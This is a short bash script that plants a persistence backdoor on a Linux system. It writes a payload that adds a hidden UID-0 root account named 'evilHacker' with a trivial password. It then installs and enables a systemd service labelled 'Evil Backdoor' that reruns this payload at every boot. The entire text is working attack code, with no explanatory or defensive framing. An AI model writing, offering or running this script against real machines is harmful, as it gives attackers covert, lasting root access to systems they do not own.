#!/usr/bin/bash
#create payload
cat <<EOF>> /home/payload.sh
#!/usr/bin/bash
useradd -u 0 -o evilHacker
echo -e "asd\nasd" | passwd evilHacker
EOF
#end of payload
chmod 775 /home/payload.sh # this is execute for payload
#create file service
cat <<EOF>> /etc/systemd/system/EvilHackerBackdoor.service
[Unit]
Description=Evil Backdoor
[Service]
Type=simple
ExecStart=/bin/bash /home/payload.sh
ExecStop=/bin/bash /home/payload.sh
[Install]
WantedBy=multi-user.target
EOF
#end of file service
#start service
systemctl enable EvilHackerBackdoor.service
systemctl start EvilHackerBackdoor.service

